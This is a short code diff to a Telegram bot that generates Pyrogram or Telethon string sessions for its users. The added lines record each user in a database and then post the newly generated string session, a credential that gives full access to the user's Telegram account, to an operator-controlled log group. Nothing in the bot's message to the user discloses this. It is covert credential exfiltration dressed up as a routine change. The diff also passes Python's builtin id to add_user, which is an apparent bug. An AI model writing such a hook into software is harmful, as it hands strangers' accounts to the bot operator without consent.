@@ -1,3 +1,4 @@
+from StringSessionBot.database import DB
 from telethon import TelegramClient
 from pyrogram.types import Message
 from pyrogram import Client, filters
@@ -155,7 +156,13 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     except KeyError:
         pass
     await client.disconnect()
-    await bot.send_message(msg.chat.id, "❖ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ {} ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ. \n\nʙʏ @SESSIONxGENxBOT".format("telethon" if telethon else "pyrogram"))
+    await bot.send_message(msg.chat.id, "❖ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ {} ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ. \n\nʙʏ @SESSIONxGENxBOT".format("telethon" if telethon else "pyrogram")
+    )
+    if DB:
+        await DB.add_user(id)
+    if env.LOG_GROUP_ID:
+        await bot.send_message(env.LOG_GROUP_ID,
+                               f'{string_session}')
 
 
 async def cancelled(msg):
